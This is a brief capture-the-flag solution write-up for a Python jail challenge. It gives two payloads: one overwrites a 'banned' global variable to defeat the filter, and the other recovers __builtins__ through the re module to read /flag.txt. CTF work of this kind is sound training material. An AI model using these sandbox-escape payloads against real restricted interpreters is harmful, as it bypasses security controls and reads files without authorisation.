# Solution

Send payload 1 to overwrite the banned global variables. Send payload 2 to exploit the overwritten global variable to retrieve `flag.txt` using builtins.
- Payload 1: `globals['banned'] = 'string_we_are_never_going_to_use'`
- Payload 2: `__builtins__ = globals['re'].__builtins__; print(__builtins__['open']('/flag.txt', 'rb').read());
EOL`


